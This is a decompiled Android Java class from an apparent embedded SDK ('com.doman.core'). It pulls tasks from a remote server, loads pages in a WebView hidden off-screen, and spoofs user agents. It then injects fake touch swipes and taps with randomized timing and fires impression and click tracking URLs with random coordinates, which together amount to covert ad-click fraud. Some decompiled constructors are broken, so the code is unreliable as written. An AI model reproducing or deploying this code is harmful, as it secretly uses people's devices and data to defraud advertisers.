package com.doman.core.ig.manager;

import android.R;
import android.app.Activity;
import android.content.Context;
import android.graphics.Bitmap;
import android.os.SystemClock;
import android.text.TextUtils;
import android.util.DisplayMetrics;
import android.util.Patterns;
import android.view.MotionEvent;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.webkit.URLUtil;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import com.android.net.p;
import com.android.net.u;
import com.doman.core.CoreMain;
import com.doman.core.a.e;
import com.doman.core.a.h;
import com.doman.core.a.i;
import com.doman.core.b.a.g;
import com.doman.core.d.f;
import com.doman.core.d.j;
import com.doman.core.d.m;
import com.doman.core.d.n;
import com.doman.core.d.o;
import com.doman.core.webview.WsWebView;
import java.util.ArrayList;
import java.util.HashMap;
import org.json.JSONException;
import org.json.JSONObject;

public class c {
    private static c b;
    i a;
    private int c = 1;
    private String d = "WbS_MTMG";
    private com.doman.core.d.a.a e;

    public class AnonymousClass1 implements Runnable {
        final String a;
        final Context b;
        final String c;

        public AnonymousClass1(String str, Context context, String str2) {
            this.a = str;
            this.b = context;
            this.c = str2;
        }

        @Override
        public final void run() {
            try {
                if (TextUtils.isEmpty(this.a)) {
                    com.doman.core.b.b bVarA = com.doman.core.b.b.a(this.b);
                    p.b<h> bVar = new p.b<h>() {
                        @Override
                        public final void a(h hVar) {
                            final h hVar2 = hVar;
                            n.a(new Runnable() {
                                @Override
                                public final void run() {
                                    try {
                                        c.a(c.this, hVar2);
                                        com.doman.core.webview.c.a(com.doman.core.webview.c.an);
                                    } catch (Exception unused) {
                                    }
                                }
                            });
                        }
                    };
                    p.a aVar = new p.a() {
                        @Override
                        public final void a(u uVar) {
                            com.doman.core.webview.c.a(com.doman.core.webview.c.ao);
                        }
                    };
                    String str = this.c;
                    if (f.a()) {
                        com.doman.core.b.c cVarA = com.doman.core.b.c.a(bVarA.a);
                        HashMap map = new HashMap();
                        JSONObject jSONObject = new JSONObject();
                        try {
                            cVarA.a(jSONObject);
                            jSONObject.put("extra", str);
                            jSONObject.put("cn_time", WebService.e);
                        } catch (JSONException unused) {
                        }
                        map.put("params", com.doman.core.b.c.a(jSONObject.toString()));
                        cVarA.a.a(new g(cVarA.b, com.doman.core.b.c.a(com.doman.core.b.f.MQTT, map), bVar, aVar));
                        return;
                    }
                    return;
                }
                if (c.this.a != null) {
                    if (!c.a(c.this.a)) {
                        if (c.this.a != null) {
                            i iVar = c.this.a;
                            iVar.e = c.this.a.e;
                            b.a().a(iVar);
                            return;
                        }
                        return;
                    }
                    com.doman.core.b.b bVarA2 = com.doman.core.b.b.a(this.b);
                    String str2 = this.a;
                    p.b<h> bVar2 = new p.b<h>() {
                        @Override
                        public final void a(h hVar) {
                            final h hVar2 = hVar;
                            n.a(new Runnable() {
                                @Override
                                public final void run() {
                                    try {
                                        c.a(c.this, hVar2);
                                        com.doman.core.webview.c.a(com.doman.core.webview.c.an);
                                        c.b(c.this, hVar2);
                                    } catch (Exception unused2) {
                                    }
                                }
                            });
                        }
                    };
                    p.a aVar2 = new p.a() {
                        @Override
                        public final void a(u uVar) {
                            com.doman.core.webview.c.a(com.doman.core.webview.c.ao);
                            c.b(c.this.a);
                        }
                    };
                    String str3 = this.c;
                    if (f.a()) {
                        com.doman.core.b.c cVarA2 = com.doman.core.b.c.a(bVarA2.a);
                        HashMap map2 = new HashMap();
                        JSONObject jSONObject2 = new JSONObject();
                        try {
                            cVarA2.a(jSONObject2);
                            if (str3 != null) {
                                jSONObject2.put("extra", str3);
                            }
                            jSONObject2.put("cn_time", WebService.e);
                        } catch (JSONException unused2) {
                        }
                        map2.put("params", com.doman.core.b.c.a(jSONObject2.toString()));
                        cVarA2.a.a(new g(cVarA2.b, str2, com.doman.core.b.c.a(null, map2), bVar2, aVar2));
                    }
                }
            } catch (Exception unused3) {
            }
        }
    }

    public class AnonymousClass3 implements com.doman.core.c.a {
        final com.doman.core.a.g a;
        final Activity b;
        final String c;
        final boolean d;

        public class AnonymousClass1 implements Runnable {
            final boolean a = true;

            public AnonymousClass1() {
            }

            @Override
            public final void run() {
                if ("2".equalsIgnoreCase(AnonymousClass3.this.a.aa) || "4".equalsIgnoreCase(AnonymousClass3.this.a.aa)) {
                    if (f.a()) {
                        CoreMain.mhandler.post(new Runnable() {
                            final com.doman.core.a.g a;

                            public AnonymousClass2() {
                                gVar = gVar;
                            }

                            @Override
                            public final void run() {
                                try {
                                    if (f.a()) {
                                        if ("2".equals(gVar.aa)) {
                                            com.doman.core.a.g gVar = gVar;
                                            p.a(gVar.y, gVar.S);
                                        } else if ("4".equals(gVar.aa)) {
                                            com.doman.core.a.g gVar2 = gVar;
                                            p.b(gVar2.x, gVar2.S);
                                        }
                                    }
                                } catch (Throwable unused) {
                                }
                            }
                        });
                        com.doman.core.webview.c.a(com.doman.core.webview.c.ap);
                        return;
                    }
                    return;
                }
                try {
                    new WsWebView(AnonymousClass3.this.b);
                } catch (Throwable unused) {
                }
                try {
                    Activity activity = AnonymousClass3.this.b;
                    if (activity == null || activity.isFinishing()) {
                        return;
                    }
                    AnonymousClass3 anonymousClass3 = AnonymousClass3.this;
                    if (anonymousClass3.d && c.b(anonymousClass3.c)) {
                        final ViewGroup viewGroup = (ViewGroup) AnonymousClass3.this.b.findViewById(R.id.content);
                        final FrameLayout frameLayout = (FrameLayout) AnonymousClass3.this.b.getLayoutInflater().inflate(com.doman.core.R.layout.ad, (ViewGroup) null);
                        o.b(viewGroup, frameLayout);
                        o.a(viewGroup, frameLayout);
                        WindowManager windowManager = AnonymousClass3.this.b.getWindowManager();
                        DisplayMetrics displayMetrics = new DisplayMetrics();
                        windowManager.getDefaultDisplay().getMetrics(displayMetrics);
                        final int i = displayMetrics.widthPixels;
                        final int i2 = displayMetrics.heightPixels;
                        FrameLayout.LayoutParams layoutParams = new FrameLayout.LayoutParams(frameLayout.getLayoutParams());
                        int i3 = i + i2;
                        if (i < i2) {
                            layoutParams.width = i;
                            layoutParams.height = i2;
                        } else {
                            layoutParams.width = i2;
                            layoutParams.height = i;
                        }
                        frameLayout.setLayoutParams(layoutParams);
                        final WsWebView wsWebView = (WsWebView) frameLayout.findViewById(com.doman.core.R.id.webview);
                        com.doman.core.webview.a.a().a(wsWebView);
                        if (AnonymousClass3.this.a.Y) {
                            com.doman.core.webview.a.a();
                            com.doman.core.webview.a.b();
                        }
                        wsWebView.setVisibility(4);
                        frameLayout.setVisibility(4);
                        if (i3 <= 0 || i3 <= i || i3 <= i2) {
                            i3 = 8000;
                        }
                        frameLayout.animate().translationX(i3);
                        if (!TextUtils.isEmpty(AnonymousClass3.this.a.Q)) {
                            wsWebView.getSettings().setUserAgentString(AnonymousClass3.this.a.Q);
                        }
                        wsWebView.getSettings().getUserAgentString();
                        wsWebView.setWebChromeClient(new WebChromeClient() {
                            private String b = "WsWebChromeClient";

                            @Override
                            public final void onProgressChanged(WebView webView, int i4) {
                                super.onProgressChanged(webView, i4);
                            }

                            @Override
                            public final void onReceivedTitle(WebView webView, String str) {
                                super.onReceivedTitle(webView, str);
                            }
                        });
                        wsWebView.setWebViewClient(new WebViewClient() {
                            @Override
                            public final void onPageFinished(WebView webView, String str) {
                                super.onPageFinished(webView, str);
                                wsWebView.setVisibility(0);
                                frameLayout.setVisibility(0);
                            }

                            @Override
                            public final void onPageStarted(WebView webView, String str, Bitmap bitmap) {
                                super.onPageStarted(webView, str, bitmap);
                            }

                            @Override
                            public final void onReceivedError(WebView webView, int i4, String str, String str2) {
                                super.onReceivedError(webView, i4, str, str2);
                            }

                            @Override
                            public final boolean shouldOverrideUrlLoading(WebView webView, final String str) {
                                try {
                                    if (!f.a() || !j.a(str, AnonymousClass3.this.a.S)) {
                                        return false;
                                    }
                                    CoreMain.mhandler.post(new Runnable() {
                                        @Override
                                        public final void run() {
                                            com.doman.core.d.a.c(AnonymousClass3.this.b, str);
                                        }
                                    });
                                    return false;
                                } catch (Throwable unused2) {
                                    return false;
                                }
                            }
                        });
                        if (f.a()) {
                            c.a(wsWebView, AnonymousClass3.this.c);
                            com.doman.core.webview.c.a(com.doman.core.webview.c.ap);
                            n.a(new Runnable() {
                                @Override
                                public final void run() {
                                    try {
                                        Thread.sleep(((int) (Math.random() * 5000.0d)) + 2370);
                                        AnonymousClass3 anonymousClass4 = AnonymousClass3.this;
                                        c.a(c.this, anonymousClass4.a, wsWebView, viewGroup, frameLayout, i, i2);
                                    } catch (Exception unused2) {
                                    }
                                }
                            });
                        }
                    }
                } catch (Throwable unused2) {
                }
            }
        }

        public AnonymousClass3(com.doman.core.a.g gVar, Activity activity, String str, boolean z) {
            this.a = gVar;
            this.b = activity;
            this.c = str;
            this.d = z;
        }

        @Override
        public final void a() {
            CoreMain.mhandler.post(new AnonymousClass1());
        }
    }

    private c() {
        try {
            if (this.e == null) {
                this.e = new com.doman.core.d.a.a();
            }
        } catch (Exception unused) {
        }
    }

    public static void b(i iVar) {
        if (iVar == null || iVar.e <= 0) {
            return;
        }
        b.a().a(iVar);
    }

    public static c a() {
        if (b == null) {
            synchronized (c.class) {
                try {
                    if (b == null) {
                        b = new c();
                    }
                } catch (Throwable th) {
                    throw th;
                }
            }
        }
        return b;
    }

    public static void b(c cVar, h hVar) {
        com.doman.core.a.b bVar;
        i iVar;
        if (hVar == null || (bVar = hVar.R) == null) {
            return;
        }
        long j = bVar.b;
        if (j <= 0 || (iVar = cVar.a) == null) {
            return;
        }
        iVar.e = j;
        b.a().a(iVar);
    }

    public static boolean b(String str) {
        try {
            return URLUtil.isValidUrl(str) && Patterns.WEB_URL.matcher(str).matches();
        } catch (Exception unused) {
        }
    }

    public final void a(Context context, String str, int i, String str2) {
        if (f.a()) {
            long jRandom = (long) (Math.random() * 5000.0d);
            if (i > 0) {
                jRandom = (long) (Math.random() * ((double) i) * 1000.0d);
            }
            com.doman.core.webview.c.a(com.doman.core.webview.c.am);
            n.a(new AnonymousClass1(str, context, str2), jRandom);
        }
    }

    public static void a(c cVar, com.doman.core.a.g gVar, com.doman.core.c.c cVar2) {
        String strReplace;
        try {
            try {
                Thread.sleep(gVar.l);
            } catch (Exception unused) {
            }
            if (((int) (Math.random() * 101.0d)) > gVar.g * 100.0d) {
                return;
            }
            String[] strArr = gVar.J;
            if (strArr != null && strArr.length > 0 && !gVar.Z) {
                cVar2.h = true;
            }
            boolean zIsAppOnForeground = CoreMain.isAppOnForeground(CoreMain.getInstance().getContext());
            Activity resumeActivity = CoreMain.getInstance().getResumeActivity();
            if (resumeActivity == null) {
                com.doman.core.webview.c.a(com.doman.core.webview.c.aq, "player page is null");
                return;
            }
            if (resumeActivity.isFinishing()) {
                com.doman.core.webview.c.a(com.doman.core.webview.c.aq, "player page is finished");
                return;
            }
            if (!zIsAppOnForeground) {
                com.doman.core.webview.c.a(com.doman.core.webview.c.aq, "app is not on");
                return;
            }
            String str = gVar.x;
            if ("2".equalsIgnoreCase(gVar.aa)) {
                if (TextUtils.isEmpty(gVar.y)) {
                    return;
                }
            } else if (TextUtils.isEmpty(str)) {
                return;
            }
            if (!gVar.Z) {
                cVar2.h = true;
            }
            if (f.a()) {
                com.doman.core.c.b bVar = new com.doman.core.c.b(gVar, cVar.new AnonymousClass3(gVar, resumeActivity, str, zIsAppOnForeground), "req_id", "task_id");
                try {
                    long j = bVar.b;
                    if (j != 0) {
                        Thread.sleep(j);
                    }
                } catch (InterruptedException unused2) {
                }
                String[] strArr2 = bVar.a;
                if (strArr2 != null && strArr2.length != 0) {
                    int length = strArr2.length;
                    for (int i = 0; i < length; i++) {
                        try {
                            String str2 = bVar.a[i];
                            if (TextUtils.isEmpty(str2) || str2.equals(null)) {
                                strReplace = "";
                            } else {
                                com.doman.core.d.g.a("WebService_MqttTaskManager", "screen_width = " + bVar.f + "screen_height= " + bVar.g + "material_width = " + bVar.d + "material_height = " + bVar.e);
                                float fRandom = (float) (Math.random() * ((double) bVar.f));
                                float fRandom2 = (float) (Math.random() * ((double) bVar.g));
                                float fRandom3 = (float) (Math.random() * ((double) bVar.d));
                                float fRandom4 = (float) (Math.random() * ((double) bVar.e));
                                strReplace = str2.replace("[CS_D_X]", String.valueOf(fRandom)).replace("[CS_D_Y]", String.valueOf(fRandom2)).replace("[CS_A_X]", String.valueOf(fRandom3)).replace("[CS_A_Y]", String.valueOf(fRandom4)).replace("[CE_D_X]", String.valueOf(fRandom)).replace("[CE_D_Y]", String.valueOf(fRandom2)).replace("[CE_A_X]", String.valueOf(fRandom3)).replace("[CE_A_Y]", String.valueOf(fRandom4));
                            }
                            com.doman.core.b.b.a(CoreMain.getInstance().getContext()).a(str2, bVar.k, bVar.l);
                            com.doman.core.webview.c.a(com.doman.core.webview.c.k, bVar.h.r, bVar.i, strReplace, bVar.j);
                        } catch (Exception unused3) {
                        }
                    }
                }
                com.doman.core.c.a aVar = bVar.c;
                if (aVar != null) {
                    aVar.a();
                }
            }
        } catch (Exception unused4) {
        }
    }

    public static void a(c cVar, final com.doman.core.a.g gVar, final WsWebView wsWebView, final ViewGroup viewGroup, final FrameLayout frameLayout, int i, int i2) {
        long j;
        long j2;
        MotionEvent motionEventObtain;
        float f;
        int i3;
        MotionEvent motionEvent;
        ArrayList arrayList;
        float f2;
        float f3;
        boolean z;
        try {
            long j3 = gVar.n;
            Thread.sleep(j3 / 2);
            if (f.a()) {
                if (wsWebView != null) {
                    int i4 = gVar.T;
                    boolean z2 = true;
                    if (i4 == 1) {
                        double d = i;
                        float f4 = (float) (gVar.U * d);
                        double d2 = i2;
                        float f5 = (float) (gVar.V * d2);
                        float f6 = (float) (gVar.W * d);
                        float f7 = (float) (gVar.X * d2);
                        int i5 = cVar.c;
                        long jUptimeMillis = SystemClock.uptimeMillis();
                        float f8 = (f6 - f4) / 116.0f;
                        float f9 = (f7 - f5) / 116.0f;
                        boolean z3 = f8 < 0.0f || f9 < 0.0f;
                        if (Math.abs(f9) <= Math.abs(f8)) {
                            z2 = false;
                        }
                        if (i5 == cVar.c) {
                            i3 = z3 ? -20 : 20;
                            f = 10.0f;
                        } else {
                            f = 116.0f;
                            i3 = 0;
                        }
                        MotionEvent motionEventObtain2 = MotionEvent.obtain(jUptimeMillis, jUptimeMillis, 0, f4, f5, 0);
                        wsWebView.onTouchEvent(motionEventObtain2);
                        j = j3;
                        MotionEvent motionEvent2 = motionEventObtain2;
                        ArrayList arrayList2 = new ArrayList();
                        long j4 = jUptimeMillis;
                        int i6 = 0;
                        boolean z4 = false;
                        while (true) {
                            if (i6 >= f) {
                                motionEvent = motionEvent2;
                                arrayList = arrayList2;
                                f2 = f4;
                                f3 = f5;
                                break;
                            }
                            float f10 = i3;
                            f4 += f8 + f10;
                            f5 += f9 + f10;
                            if ((z3 && f4 < f6) || (!z3 && f4 > f6)) {
                                z4 = !z2;
                                f4 = f6;
                            }
                            if ((!z3 || f5 >= f7) && (z3 || f5 <= f7)) {
                                z = z4;
                            } else {
                                f5 = f7;
                                z = z2;
                            }
                            long j5 = (long) (j4 + 20.0f);
                            int i7 = i3;
                            int i8 = i6;
                            motionEvent = motionEvent2;
                            float f11 = f7;
                            arrayList = arrayList2;
                            MotionEvent motionEventObtain3 = MotionEvent.obtain(jUptimeMillis, j5, 2, f4, f5, 0);
                            arrayList.add(motionEventObtain3);
                            wsWebView.onTouchEvent(motionEventObtain3);
                            i3 = i5 == cVar.c ? i7 + (z3 ? -70 : 70) : i7;
                            if (z) {
                                f2 = f4;
                                f3 = f5;
                                j4 = j5;
                                break;
                            } else {
                                i6 = i8 + 1;
                                arrayList2 = arrayList;
                                z4 = z;
                                j4 = j5;
                                f7 = f11;
                                motionEvent2 = motionEvent;
                            }
                        }
                        motionEventObtain = MotionEvent.obtain(jUptimeMillis, j4, 1, f2, f3, 0);
                        wsWebView.onTouchEvent(motionEventObtain);
                        motionEvent.recycle();
                        for (int i9 = 0; i9 < arrayList.size(); i9++) {
                            ((MotionEvent) arrayList.get(i9)).recycle();
                        }
                    } else {
                        j = j3;
                        if (i4 == 2) {
                            float f12 = (float) (gVar.U * ((double) i));
                            float f13 = (float) (gVar.V * ((double) i2));
                            long jUptimeMillis2 = SystemClock.uptimeMillis();
                            MotionEvent motionEventObtain4 = MotionEvent.obtain(jUptimeMillis2, jUptimeMillis2, 0, f12, f13, 0);
                            wsWebView.onTouchEvent(motionEventObtain4);
                            motionEventObtain = MotionEvent.obtain(jUptimeMillis2, jUptimeMillis2 + 90, 1, f12, f13, 0);
                            wsWebView.onTouchEvent(motionEventObtain);
                            motionEventObtain4.recycle();
                        }
                        j2 = 2;
                    }
                    motionEventObtain.recycle();
                    j2 = 2;
                } else {
                    j = j3;
                    j2 = 2;
                }
                Thread.sleep(j / j2);
                CoreMain.mhandler.post(new Runnable() {
                    @Override
                    public final void run() {
                        com.doman.core.webview.c.a(com.doman.core.webview.c.l, gVar.r, "", "", "");
                        frameLayout.setVisibility(8);
                        o.b(viewGroup, frameLayout);
                        c.a(c.this, wsWebView);
                    }
                });
            }
        } catch (Exception unused) {
        }
    }

    public static void a(c cVar, h hVar) {
        ArrayList<com.doman.core.a.g> arrayList;
        ArrayList<com.doman.core.a.g> arrayList2;
        com.doman.core.a.g gVar;
        int i;
        if (hVar == null || (arrayList = hVar.Q) == null || arrayList.size() <= 0) {
            return;
        }
        int size = arrayList.size();
        int i2 = 0;
        while (i2 < size) {
            final com.doman.core.a.g gVar2 = arrayList.get(i2);
            final com.doman.core.c.c cVar2 = new com.doman.core.c.c(gVar2, (long) (Math.random() * 500.0d), gVar2.Q, gVar2.R);
            com.doman.core.d.a.a aVar = cVar.e;
            try {
                cVar2.i = aVar;
                if (aVar != null) {
                    aVar.a(cVar2);
                }
            } catch (Exception unused) {
            }
            n.a(new Runnable() {
                @Override
                public final void run() {
                    c.a(c.this, gVar2, cVar2);
                }
            });
            try {
                if (cVar2.b.w.equals("1")) {
                    ArrayList<e> arrayList3 = cVar2.a;
                    if (arrayList3 != null && arrayList3.size() != 0) {
                        int size2 = cVar2.a.size();
                        for (int i3 = 0; i3 < size2; i3++) {
                            e eVar = cVar2.a.get(i3);
                            int i4 = eVar.a;
                            String str = eVar.b;
                            if (i4 == 0) {
                                com.doman.core.b.b.a(CoreMain.getInstance().getContext()).a(str, cVar2.f, cVar2.g);
                                com.doman.core.webview.c.a(com.doman.core.webview.c.j, cVar2.b.r, cVar2.c, str, cVar2.d);
                            }
                        }
                    }
                    com.doman.core.a.g gVar3 = cVar2.b;
                    if (gVar3 != null && (i = gVar3.E) > 0) {
                        Thread.sleep(i * 1000);
                    }
                } else {
                    if (cVar2.b.w.equals("2")) {
                        try {
                            if (cVar2.i != null && (gVar = cVar2.b) != null && gVar.F > 0) {
                                cVar2.j.clear();
                                cVar2.i.a();
                            }
                        } catch (Exception unused2) {
                        }
                        ArrayList<e> arrayList4 = cVar2.a;
                        if (arrayList4 != null && arrayList4.size() != 0) {
                            int size3 = cVar2.a.size();
                            int i5 = (cVar2.b.E * 1000) / 4;
                            ArrayList<e> arrayList5 = new ArrayList<>();
                            ArrayList<e> arrayList6 = new ArrayList<>();
                            ArrayList<e> arrayList7 = new ArrayList<>();
                            ArrayList<e> arrayList8 = new ArrayList<>();
                            ArrayList<e> arrayList9 = new ArrayList<>();
                            ArrayList arrayList10 = new ArrayList();
                            for (int i6 = 0; i6 < size3; i6++) {
                                e eVar2 = cVar2.a.get(i6);
                                int i7 = eVar2.a;
                                if (i7 == 0) {
                                    arrayList5.add(eVar2);
                                } else if (i7 == 1) {
                                    arrayList6.add(eVar2);
                                } else if (i7 == 2) {
                                    arrayList7.add(eVar2);
                                } else if (i7 == 3) {
                                    arrayList8.add(eVar2);
                                } else if (i7 == 4) {
                                    arrayList9.add(eVar2);
                                } else if (i7 == 201) {
                                    cVar2.j.add(eVar2);
                                } else if (i7 == 301) {
                                    arrayList10.add(eVar2);
                                }
                            }
                            int size4 = arrayList10.size();
                            if (size4 > 0) {
                                n.a(new Runnable() {
                                    final int a;
                                    final ArrayList b;
                                    final int c = 301;

                                    public class AnonymousClass1 implements Runnable {
                                        final e a;
                                        final String b;

                                        public AnonymousClass1() {
                                            eVar = eVar;
                                            str = str;
                                        }

                                        @Override
                                        public final void run() {
                                            if (eVar.a()) {
                                                com.doman.core.b.b bVarA = com.doman.core.b.b.a(CoreMain.getInstance().getContext());
                                                e eVar = eVar;
                                                c cVar = c.this;
                                                bVarA.a(eVar, cVar.f, cVar.g);
                                            } else {
                                                com.doman.core.b.b bVarA2 = com.doman.core.b.b.a(CoreMain.getInstance().getContext());
                                                String str = str;
                                                c cVar2 = c.this;
                                                bVarA2.a(str, cVar2.f, cVar2.g);
                                            }
                                            String str2 = com.doman.core.webview.c.j;
                                            c cVar3 = c.this;
                                            com.doman.core.webview.c.a(str2, cVar3.b.r, cVar3.c, str, cVar3.d);
                                        }
                                    }

                                    public AnonymousClass2() {
                                        i = size4;
                                        arrayList = arrayList10;
                                    }

                                    @Override
                                    public final void run() {
                                        for (int i8 = 0; i8 < i; i8++) {
                                            e eVar3 = (e) arrayList.get(i8);
                                            if (eVar3.a == this.c) {
                                                String str2 = eVar3.b;
                                                long j = eVar3.g * 1000;
                                                com.doman.core.d.g.a(c.this.e, str2);
                                                n.a(new Runnable() {
                                                    final e a;
                                                    final String b;

                                                    public AnonymousClass1() {
                                                        eVar = eVar3;
                                                        str = str2;
                                                    }

                                                    @Override
                                                    public final void run() {
                                                        if (eVar.a()) {
                                                            com.doman.core.b.b bVarA = com.doman.core.b.b.a(CoreMain.getInstance().getContext());
                                                            e eVar4 = eVar;
                                                            c cVar3 = c.this;
                                                            bVarA.a(eVar4, cVar3.f, cVar3.g);
                                                        } else {
                                                            com.doman.core.b.b bVarA2 = com.doman.core.b.b.a(CoreMain.getInstance().getContext());
                                                            String str3 = str;
                                                            c cVar4 = c.this;
                                                            bVarA2.a(str3, cVar4.f, cVar4.g);
                                                        }
                                                        String str4 = com.doman.core.webview.c.j;
                                                        c cVar5 = c.this;
                                                        com.doman.core.webview.c.a(str4, cVar5.b.r, cVar5.c, str, cVar5.d);
                                                    }
                                                }, j);
                                            }
                                        }
                                    }
                                });
                            }
                            int size5 = arrayList5.size();
                            int size6 = arrayList6.size();
                            int size7 = arrayList7.size();
                            int size8 = arrayList8.size();
                            int size9 = arrayList9.size();
                            if (size5 > 0) {
                                arrayList2 = arrayList;
                                try {
                                    cVar2.a(arrayList5, size5, 0, "000000ImpressionTask trackingRequestWaitthread currentThread" + Thread.currentThread());
                                } catch (Exception unused3) {
                                }
                            } else {
                                arrayList2 = arrayList;
                            }
                            long jCurrentTimeMillis = System.currentTimeMillis();
                            long j = i5;
                            com.doman.core.c.c.a(j);
                            long jCurrentTimeMillis2 = System.currentTimeMillis() - jCurrentTimeMillis;
                            long j2 = 2000 + j;
                            if (jCurrentTimeMillis2 <= j2) {
                                if (size6 > 0 && !cVar2.h) {
                                    cVar2.a(arrayList6, size6, 1, "111111ImpressionTask trackingRequestWaitthread currentThread" + Thread.currentThread());
                                }
                                long jCurrentTimeMillis3 = System.currentTimeMillis();
                                com.doman.core.c.c.a(j);
                                if (System.currentTimeMillis() - jCurrentTimeMillis3 <= j2) {
                                    if (size7 > 0 && !cVar2.h) {
                                        cVar2.a(arrayList7, size7, 2, "2222222ImpressionTask trackingRequestWaitthread currentThread" + Thread.currentThread());
                                    }
                                    long jCurrentTimeMillis4 = System.currentTimeMillis();
                                    com.doman.core.c.c.a(j);
                                    if (System.currentTimeMillis() - jCurrentTimeMillis4 <= j2) {
                                        if (size8 > 0 && !cVar2.h) {
                                            cVar2.a(arrayList8, size8, 3, "33333333ImpressionTask trackingRequestWait thread currentThread" + Thread.currentThread());
                                        }
                                        long jCurrentTimeMillis5 = System.currentTimeMillis();
                                        com.doman.core.c.c.a(j);
                                        if (System.currentTimeMillis() - jCurrentTimeMillis5 <= j2 && size9 > 0 && !cVar2.h) {
                                            cVar2.a(arrayList9, size9, 4, "4444444444444ImpressionTask trackingRequestWaitthread currentThread" + Thread.currentThread());
                                        }
                                    }
                                }
                            }
                        }
                    }
                    i2++;
                    arrayList = arrayList2;
                }
            } catch (Exception unused4) {
            }
            arrayList2 = arrayList;
            i2++;
            arrayList = arrayList2;
        }
    }

    public static void a(c cVar, WsWebView wsWebView) {
        com.doman.core.d.g.a(cVar.d, "distoryWebView distoryWebView 1");
        if (wsWebView == null) {
            com.doman.core.d.g.a(cVar.d, "distoryWebView distoryWebView 2");
        } else {
            try {
                wsWebView.destroy();
            } catch (Exception unused) {
            }
        }
    }

    public static void a(WsWebView wsWebView, String str) {
        if (TextUtils.isEmpty(str)) {
            return;
        }
        wsWebView.loadUrl(str);
    }

    public static boolean a(i iVar) {
        if (iVar == null) {
            return false;
        }
        try {
            b.a();
            boolean zB = b.b();
            int i = iVar.c;
            if (i == 1 && !zB) {
                return false;
            }
            if (i == 2 && zB) {
                return false;
            }
            boolean zA = m.a();
            int i2 = iVar.d;
            if (i2 != 1 || zA) {
                return (i2 == 2 && zA) ? false : true;
            }
            return false;
        } catch (Throwable unused) {
            return false;
        }
    }
}
